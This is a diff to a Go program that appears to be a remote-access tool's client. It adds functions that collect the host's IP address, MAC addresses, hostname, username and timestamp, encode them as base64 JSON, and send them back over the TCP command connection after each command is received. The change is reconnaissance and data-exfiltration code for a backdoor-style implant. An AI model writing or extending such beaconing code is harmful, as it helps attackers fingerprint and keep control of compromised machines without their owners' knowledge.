@@ -2,20 +2,102 @@ package main
 
 import (
 	"bufio"
+	"encoding"
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"net"
 	"os"
 	"os/exec"
+	"os/user"
 	"strings"
+	"time"
 )
-
-//test
 
 const (
 	connHost = "localhost"
 	connPort = "7025"
 	connType = "tcp"
 )
+
+type Packet struct {
+	Type     bool   `json:"Type"`
+	DevIP    string `json:"devIp"`
+	Hostname string `json:"Hostname"`
+	Username string `json:"username"`
+	Time     string `json:"time"`
+	Result   string `json:"Result"`
+	Mac      string `json:"Mac"`
+}
+
+func getLocalIP() net.IP {
+    conn, err := net.Dial("udp", "8.8.8.8:80")
+    if err != nil {
+        fmt.Println(err)
+    }
+    defer conn.Close()
+
+    localAddr := conn.LocalAddr().(*net.UDPAddr)
+
+    return localAddr.IP
+}
+
+func getMacAddr() []string {
+	ifas, err := net.Interfaces()
+	if err != nil {
+		fmt.Println(err)
+	}
+	var as []string
+	for _, ifa := range ifas {
+		a := ifa.HardwareAddr.String()
+		if a != "" {
+			as = append(as, a)
+		}
+	}
+	return as
+}
+
+func getHostname() string {
+	os, err := os.Hostname()
+	if err != nil {
+		fmt.Println(err)
+	}
+	return os
+}
+
+func getUsername() string {
+	name, err := user.Current()
+	if err != nil {
+		fmt.Println(err)
+	}
+	return name.Name
+}
+
+func arrToString(strArray []string) string {
+	return strings.Join(strArray, " ")
+}
+
+
+func writeData() string {
+	sendData := Packet{
+		Type:     true,
+		DevIP:    getLocalIP().String(),
+		Hostname: getHostname(),
+		Username: getUsername(),
+		Time:     time.Now().UTC().Format("2006-01-02 15:04:05"),
+		Result:   "{FROM FUNC}",
+		Mac:      arrToString(getMacAddr()),
+	}
+
+	dat, err := json.Marshal(sendData)
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	encoded := base64.StdEncoding.EncodeToString([]byte(dat))
+
+	return encoded
+}
 
 func handleConnection(conn net.Conn) {
 	buffer, err := bufio.NewReader(conn).ReadString('\n')
@@ -37,6 +119,7 @@ func handleConnection(conn net.Conn) {
 		return
 	}
 	print(string(command))
+	conn.Write([]byte(writeData()))
 	conn.Write([]byte("foobar"))
 }
 
